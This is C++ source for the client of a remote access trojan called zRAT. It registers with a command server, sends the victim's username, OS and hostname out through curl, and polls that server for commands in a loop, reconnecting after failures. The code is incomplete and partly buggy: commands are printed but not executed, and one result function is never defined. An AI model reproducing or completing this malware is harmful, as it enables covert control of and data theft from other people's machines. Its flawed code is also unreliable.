#include <iostream>
#include <ctime>
#include <cstdlib>
#include <cstdio>
#include <unistd.h> //sleep()

using namespace std;

string surl = "http://localhost/zRAT/server/";   //上线地址
int times = 3000;           //请求周期 ms
string sid = "";
string key = "";
bool debug = false;

/**
* @brief get randon string
*/
string getSalt(int len = 100);

int init();
bool chkEnv();
bool reg();
string getCommand();
bool sendResult(string cid, int status, string data);
string getContent(string url);
string getLocalIP();
string getOS();
string getUsername();
string getHostname();
string zExec(string command);


int main()
{
    init();
    return 0;
}

int init()
{
    srand(time(NULL));
    sid = getSalt(123);
    key = getSalt(123);
    cout << "Trying to connect to server." << endl;
    if(!chkEnv())
    {
        cout << "Failed to connect to server." << endl;
        cout << "Sleeping." << endl;
        sleep(300);
        init();
        return -1;
    }
    cout << "\nConnected to server." << endl;
    if(!reg())
    {
        cout << "Failed to registe." << endl;
        cout << "Sleeping." << endl;
        sleep(600);
        init();
        return -1;
    }
    cout << "\nSuccess to registe." << endl;
    if(debug)
    {
        cout << "sid:" << sid << endl;
    }
    do
    {
        string command = getCommand();
        if(command == "")
        {
            cout << "\nFail to get command. Reregisting..." << endl;
            break;
        }
        cout << "\nGet command: " << command << endl;
        sleep(5);
    }while(1);
    init();
    return 0;
}

string getSalt(int len)
{
    int i;
    len = len;
    char str[len + 1];
    for(i=0;i<len;++i)
        str[i]='A'+rand()%26;
    str[++i]='\0';
    string temp(str);
    return temp.substr(0, temp.length() - 1);
}

bool chkEnv()
{
    string str = getContent(surl + "auth.php");
    if(str.find("status") == string::npos)
        return false;
    return true;
}

bool reg()
{
    string data = "\"sid=" + sid + "&key=" + key + "&data={\\\"username\\\":\\\"" + getUsername() + "\\\",\\\"os\\\":\\\"" + getOS() + "\\\",\\\"hostname\\\":\\\"" + getHostname() + "\\\",\\\"ip\\\":\\\"" + getLocalIP() + "\\\"}\"";
    //cout << "curl -d " + data + " " + surl + "auth.php" << endl;
    zExec("curl --max-time 3 -d " + data + " " + surl + "auth.php");
    return true;
}

string getContent(string url)
{
    return zExec("curl --max-time 3 " + url);
}

string getLocalIP()
{
    return "127.0.0.1";
}

string getOS()
{
    string str = zExec("uname -r");
    return str.substr(0, str.length() - 1);
}

string getUsername()
{
    string str = zExec("whoami");
    return str.substr(0, str.length() - 1);
}

string getHostname()
{
    string str = zExec("uname -n");
    return str.substr(0, str.length() - 1);
}

string zExec(string command)
{
    FILE *fp;
    char str[2000];
    if ((fp = popen(command.data(), "r")) == NULL)
        return "";
    if(fgets(str, sizeof(str) - 1, fp) == NULL)
        return "";
    if(debug)
    {
        cout << "\nCommand::`" + command + "`::`" + str + "`" << endl;
    }
    string temp(str);
    return temp;
}

string getCommand()
{
    string data = "\"sid=" + sid + "\"";
    string result = zExec("curl --max-time 3 -d " + data + " " + surl + "hook.php");
    if(result == "")
        return "404";
    else
        return result;
}
